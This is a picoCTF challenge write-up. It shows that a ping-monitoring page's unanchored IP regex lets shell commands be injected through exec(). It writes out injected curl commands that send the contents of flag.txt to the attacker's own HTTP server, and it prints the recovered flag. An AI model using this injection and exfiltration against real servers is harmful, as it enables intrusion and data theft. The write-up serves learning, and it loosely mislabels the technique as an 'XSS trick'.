# fancy-alive-monitoring

As we can see on the page source (`index.txt`) the JS script does a pretty good job of checking the ip with `ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/`.

But, at the same time, request can be made from other sources, like a `postman` client, isn't it? What we'll do is make a request to `http://2018shell.picoctf.com:17593/index.php` 
with `form-encoded` data `1.1.1.1`. The result, as expected, is `Target is alive`

Now, let's look at the php script and notice that it doesn't really verify that the regex should match the *entire* string, because it doesn't have the `$` sign at the end. It just says that the string
should *start* with an `IP`, leaving us an infinite space of possibility.

It is also important to notice that the ip is appended to the `ping -c 1 ` command, but the `exec` function executes the whole string, which might contain more commands, separated by `;`

We can try to send a command like `ping -c 1 1.1.1.1; ls` which will execute the `ping` *AND* the `ls`, but the server doesn't output anything besides `Target is/not Alive`, which is almost useless.

And easy way out would be to use an old `XSS` trick. Setup a simple http server by running `python -m SimpleHTTPServer`, get the your ip and send the command `1.1.1.1; curl <your-ip>:<your_port>/hello`. If it works, your server will
a `GET` request `18.188.70.152 - - [07/Apr/2019 21:08:53] "GET /hello HTTP/1.1" 404` which is awesome. 

Now, let's use some `bash` trickery an examine this command `$(cat flag.txt | tr " " "$")` - it will write the flag and pass it to `tr` that will replace every whitespace with a dollar sign. (urls can't contain whitespaces).
Moreover, this will be evaluated at runtine, meaning we can connect it with other commands, espectially the one we used before `curl <your-ip>:<your_port>/$(cat flag.txt | tr " " "$")` - this will send a HTTP GET request to the
server at the url specified by the contents of `flag.txt`

Gotcha! We have got the flag `18.188.70.152 - - [07/Apr/2019 21:09:02] "GET /Here$is$your$flag:$picoCTFn3v3r_trust_a_b0x_d7ad162d HTTP/1.1" 404 -`